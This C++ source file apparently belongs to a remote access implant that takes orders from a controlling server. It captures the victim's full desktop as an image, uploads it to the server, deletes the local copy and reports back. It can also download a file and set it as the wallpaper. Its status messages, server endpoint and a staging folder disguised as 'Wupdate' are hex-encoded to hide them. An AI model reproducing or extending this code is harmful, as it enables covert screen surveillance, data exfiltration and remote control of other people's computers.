#include "ScreenFunctions.h"

HttpRequests WinHttpRequests;
UploadDownload uploadDownload;

bool ScreenFunctions::SaveBitmap(WCHAR* wPath)
{
	BITMAPFILEHEADER bfHeader;
	BITMAPINFOHEADER biHeader;
	BITMAPINFO bInfo;
	HGDIOBJ hTempBitmap;
	HBITMAP hBitmap;
	BITMAP bAllDesktops;
	HDC hDC, hMemDC;
	LONG lWidth, lHeight;
	BYTE* bBits = NULL;
	HANDLE hHeap = GetProcessHeap();
	DWORD cbBits, dwWritten = 0;
	INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
	INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
	CImage image;

	ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
	ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
	ZeroMemory(&bInfo, sizeof(BITMAPINFO));
	ZeroMemory(&bAllDesktops, sizeof(BITMAP));

	hDC = GetDC(NULL);
	if (hDC == NULL)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
	if (hTempBitmap == NULL)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);
	if (&bAllDesktops == 0)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	lWidth = bAllDesktops.bmWidth;
	lHeight = bAllDesktops.bmHeight;
	if (DeleteObject(hTempBitmap) == 0)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}

	bfHeader.bfType = (WORD)('B' | ('M' << 8));
	bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	biHeader.biSize = sizeof(BITMAPINFOHEADER);
	biHeader.biBitCount = 24;
	biHeader.biCompression = BI_RGB;
	biHeader.biPlanes = 1;
	biHeader.biWidth = lWidth;
	biHeader.biHeight = lHeight;
	bInfo.bmiHeader = biHeader;
	cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;
	hMemDC = CreateCompatibleDC(hDC);
	if (hMemDC == NULL)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
	if (hBitmap == NULL)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	if (SelectObject(hMemDC, hBitmap) == NULL)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	if (BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY) == 0)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	image.Attach(hBitmap);
	image.Save(wPath);
	if (DeleteDC(hMemDC) == 0)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	if (ReleaseDC(NULL, hDC) == 0)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	if (DeleteObject(hBitmap) == 0)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	return true;
}

bool ScreenFunctions::ChangeBackground(LPCWSTR imagePath)
{

	HRESULT hr = CoInitialize(nullptr);
	IDesktopWallpaper* pDesktopWallpaper = nullptr;
	hr = CoCreateInstance(__uuidof(DesktopWallpaper), nullptr, CLSCTX_ALL, IID_PPV_ARGS(&pDesktopWallpaper));
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return false;
	}
	else
	{
		pDesktopWallpaper->SetWallpaper(nullptr, imagePath);
		pDesktopWallpaper->SetPosition(DWPOS_FILL);
		return true;
	}
}

void ScreenFunctions::startCaptureThread(string path, PublicStructers::client clientInfo, int id)
{
	path = path + "\\" + to_string(id) + ".jpg";
	string finalData;
	wstring wPath = wstring(path.begin(), path.end());
	if (!SaveBitmap((WCHAR*)wPath.c_str()))
		finalData = Encryptions::hexToAscii("4661696c656420746f206368616e676564206261636b67726f756e6421");
	else
	{
		if (!uploadDownload.upload_to_server(path, clientInfo))
			finalData = Encryptions::hexToAscii("43617074757265206661696c656421");
		else
		{
			Sleep(1000);
			finalData = Encryptions::hexToAscii("436170747572652073756363656564656421");
			if (!DeleteFileW(Utils::s2ws(path).c_str())) {
			#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
			#endif
			}
		}
	}
	WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
}

void ScreenFunctions::startChangeBackgroundThread(string filename, PublicStructers::client clientInfo)
{
	string tempPath = Encryptions::hexToAscii("433a5c50726f6772616d446174615c577570646174655c") + filename;
	wstring wPath = wstring(tempPath.begin(), tempPath.end());
	string finalData = Encryptions::hexToAscii("4661696c656420746f206368616e676564206261636b67726f756e6421");
	if (uploadDownload.upload_to_client(filename, clientInfo))
	{
		if (ChangeBackground(wPath.c_str()))
			finalData = Encryptions::hexToAscii("5375636365737366756c6c79206368616e676564206261636b726f756e6421");
	}
	WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
}
